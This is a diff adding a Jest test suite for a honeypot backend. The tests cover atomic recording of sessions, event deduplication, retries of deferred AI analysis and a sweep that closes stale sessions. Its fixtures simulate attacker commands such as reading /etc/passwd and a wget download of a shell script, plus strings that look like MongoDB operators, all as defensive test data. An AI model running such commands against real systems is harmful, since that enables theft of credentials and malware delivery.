@@ -1,0 +1,197 @@
+'use strict'
+/**
+ * M2: honeypot activity is recorded with one atomic pipeline update (no lost updates, attacker strings
+ * stored literally). M12: stale "active" sessions are closed by the sweep with their real duration, and
+ * session start time comes from Cowrie's event time. Real in-memory MongoDB.
+ */
+const mongoose = require('mongoose')
+const { MongoMemoryServer } = require('mongodb-memory-server')
+
+jest.mock('../services/aiEngineService', () => ({
+  predictHoneypotSession: jest.fn().mockResolvedValue(null),
+  getDeceptionScore: jest.fn().mockResolvedValue(null),
+  getBlockThreshold: jest.fn().mockResolvedValue(0.92),
+  getAlertThreshold: jest.fn().mockResolvedValue(0.7),
+}))
+jest.mock('../services/campaignService', () => ({ clusterSession: jest.fn() }))
+jest.mock('../websocket/socketManager', () => ({ emitHoneypotEvent: jest.fn(), emitNewThreat: jest.fn() }))
+
+const HoneypotSession = require('../models/HoneypotSession')
+const honeypotService = require('../services/honeypotService')
+const { HoneypotSweepService } = require('../services/honeypotSweepService')
+const collector = require('../../honeypot/collectors/session_collector')
+
+describe('atomic honeypot activity and stale-session sweep', () => {
+  let mongoServer
+  beforeAll(async () => {
+    mongoServer = await MongoMemoryServer.create()
+    await mongoose.connect(mongoServer.getUri())
+  }, 60000)
+  afterAll(async () => {
+    await mongoose.disconnect()
+    if (mongoServer) await mongoServer.stop()
+  })
+  beforeEach(async () => {
+    await mongoose.connection.db.collection('honeypotsessions').deleteMany({})
+    await mongoose.connection.db.collection('threatlogs').deleteMany({})
+    await mongoose.connection.db.collection('alerts').deleteMany({})
+  })
+
+  const newSession = (sessionId, extra = {}) =>
+    HoneypotSession.create({ sessionId, sourceIP: '198.51.100.20', status: 'active', ...extra })
+
+  test('M2: 25 concurrent commands are all kept and the score is computed from all of them', async () => {
+    await newSession('concurrent')
+    await Promise.all(
+      Array.from({ length: 25 }, (_, i) =>
+        collector.onCommandReceived({
+          sessionId: 'concurrent',
+          sourceIP: '198.51.100.20',
+          command: i === 0 ? 'cat /etc/passwd' : `echo ${i}`,
+          intent: i === 0 ? 'CREDENTIAL_HARVEST' : 'UNKNOWN',
+        })
+      )
+    )
+    const s = await HoneypotSession.findOne({ sessionId: 'concurrent' })
+    expect(s.commands).toHaveLength(25)
+    expect(s.filesAccessed).toEqual(['/etc/passwd'])
+    expect(s.deceptionScore).toBe(Math.min(100, 25 * 3 + 10)) // 85
+    expect(s.engagementLevel).toBe('deep')
+    expect(s.mitreTechniques.length).toBeGreaterThan(0)
+  })
+
+  test('M2: attacker strings that look like operators are stored as text', async () => {
+    await newSession('literal')
+    await honeypotService.recordSessionActivity(
+      { sessionId: 'literal' },
+      { commands: [{ command: '$commands', timestamp: new Date(), success: true, intent: null }], urls: ['$sessionId'] }
+    )
+    const s = await HoneypotSession.findOne({ sessionId: 'literal' }).lean()
+    expect(s.commands[0].command).toBe('$commands')
+    expect(s.iocExtracted.urls).toEqual(['$sessionId'])
+    expect(s.sessionId).toBe('literal')
+  })
+
+  test('M2: download bonus is kept when later commands arrive', async () => {
+    await newSession('download')
+    await collector.onFileDownload({
+      sessionId: 'download',
+      sourceIP: '198.51.100.20',
+      url: 'http://x.test/a',
+      sha256: 'ab',
+    })
+    let s = await HoneypotSession.findOne({ sessionId: 'download' })
+    expect(s.downloadCount).toBe(1)
+    expect(s.deceptionScore).toBe(8 + 15)
+    await collector.onCommandReceived({
+      sessionId: 'download',
+      sourceIP: '198.51.100.20',
+      command: 'id',
+      intent: 'RECONNAISSANCE',
+    })
+    s = await HoneypotSession.findOne({ sessionId: 'download' })
+    expect(s.deceptionScore).toBe(3 + 8 + 15) // previously the +15 was lost on the next command
+    expect(s.iocExtracted.hashes).toEqual(['ab'])
+  })
+
+  test('3.5: a replayed command event (same eventId) is applied once and alerts once', async () => {
+    await newSession('replay')
+    const event = {
+      sessionId: 'replay',
+      sourceIP: '198.51.100.20',
+      command: 'wget http://x.test/a.sh',
+      intent: 'MALWARE_DOWNLOAD',
+      eventId: 'a1b2c3d4e5f60718293a4b5c6d7e8f90',
+    }
+    const first = await collector.onCommandReceived(event)
+    const second = await collector.onCommandReceived(event)
+    expect(first.$locals.duplicateEvent).toBeUndefined()
+    expect(second.$locals.duplicateEvent).toBe(true)
+    await collector.onCommandReceived({ ...event, eventId: 'ffffffffffffffffffffffffffffffff' })
+    const s = await HoneypotSession.findOne({ sessionId: 'replay' }).select('+ingestEventIds')
+    expect(s.commands).toHaveLength(2)
+    expect(s.ingestEventIds).toHaveLength(2)
+    // M2: a second, different MALWARE_DOWNLOAD command in the same session does not raise a second alert.
+    expect(await mongoose.connection.db.collection('alerts').countDocuments()).toBe(1)
+    expect((await HoneypotSession.findOne({ sessionId: 'replay' }).lean()).ingestEventIds).toBeUndefined()
+  })
+
+  test('3.5: a doubly delivered download (same eventId) counts once', async () => {
+    await newSession('dl-twice')
+    const event = {
+      sessionId: 'dl-twice',
+      sourceIP: '198.51.100.20',
+      url: 'http://x.test/a',
+      eventId: 'abcdef0123456789',
+    }
+    await collector.onFileDownload(event)
+    await collector.onFileDownload(event)
+    const s = await HoneypotSession.findOne({ sessionId: 'dl-twice' })
+    expect(s.downloadCount).toBe(1)
+    expect(await mongoose.connection.db.collection('alerts').countDocuments()).toBe(1)
+  })
+
+  test('3.5: a closure without the AI engine is flagged and retried by the sweep, a bounded number of times', async () => {
+    await newSession('ai-down')
+    const s = await HoneypotSession.findOne({ sessionId: 'ai-down' })
+    await honeypotService.closeSession(s._id, { telemetry: { durationSeconds: 30 } })
+    let closed = await HoneypotSession.findById(s._id)
+    expect(closed.closureAnalysisState).toBe('complete')
+    expect(closed.aiAnalysisPending).toBe(true)
+    expect(closed.deceptionScoringPending).toBe(true)
+
+    const sweep = new HoneypotSweepService({ retryMinutes: 5, maxAnalysisAttempts: 2 })
+    expect((await sweep.retryDeferredAnalysis()).found).toBe(0) // not due yet
+    const later = () => new Date(Date.now() + 10 * 60000)
+    expect(await sweep.retryDeferredAnalysis(later())).toEqual({ found: 1, completed: 0, stillPending: 1 })
+    expect(await sweep.retryDeferredAnalysis(later())).toEqual({ found: 1, completed: 0, stillPending: 1 })
+    expect((await sweep.retryDeferredAnalysis(later())).found).toBe(0) // attempts exhausted
+    closed = await HoneypotSession.findById(s._id)
+    expect(closed.deferredAnalysisAttempts).toBe(2)
+    expect(closed.closureAnalysisState).toBe('complete')
+    expect(closed.aiAnalysisPending).toBe(true)
+  })
+
+  test('M6: honeypot analytics only aggregate the 7-day reporting window', async () => {
+    await newSession('recent', { commands: [{ command: 'id' }], deceptionScore: 10 })
+    await newSession('ancient', { commands: [{ command: 'old-cmd' }], sourceIP: '203.0.113.99', deceptionScore: 90 })
+    await mongoose.connection.db
+      .collection('honeypotsessions')
+      .updateOne({ sessionId: 'ancient' }, { $set: { createdAt: new Date(Date.now() - 30 * 86400000) } })
+
+    const analytics = await honeypotService.getFullAnalytics()
+    expect(analytics.charts.topCommands.map((c) => c._id)).toEqual(['id'])
+    expect(analytics.intelligence.topAttackers.map((a) => a._id)).toEqual(['198.51.100.20'])
+    expect(analytics.kpis.avgDeceptionScore).toBe(10)
+    expect(analytics.reporting.analyticsWindow.days).toBe(7)
+  })
+
+  test('M12: session start time comes from the Cowrie event, not ingestion time', async () => {
+    await collector.onSessionOpened({
+      sessionId: 'replayed',
+      sourceIP: '198.51.100.21',
+      startTime: '2017-07-07T13:30:00Z',
+    })
+    const s = await HoneypotSession.findOne({ sessionId: 'replayed' })
+    expect(s.startTime.toISOString()).toBe('2017-07-07T13:30:00.000Z')
+  })
+
+  test('M12: the sweep closes only stale active sessions, with duration up to the last activity', async () => {
+    const start = new Date(Date.now() - 10 * 3600 * 1000)
+    const lastActivity = new Date(start.getTime() + 120 * 1000)
+    await newSession('stale', { startTime: start })
+    await newSession('fresh')
+    // Backdate updatedAt directly; Mongoose timestamps would otherwise reset it.
+    await mongoose.connection.db
+      .collection('honeypotsessions')
+      .updateOne({ sessionId: 'stale' }, { $set: { updatedAt: lastActivity } })
+
+    const result = await new HoneypotSweepService({ staleHours: 6 }).sweepStaleSessions()
+    expect(result).toEqual({ found: 1, closed: 1, failed: 0 })
+    const stale = await HoneypotSession.findOne({ sessionId: 'stale' })
+    expect(stale.status).toBe('closed')
+    expect(stale.closureAnalysisState).toBe('complete')
+    expect(stale.durationSeconds).toBe(120)
+    expect((await HoneypotSession.findOne({ sessionId: 'fresh' })).status).toBe('active')
+  })
+})
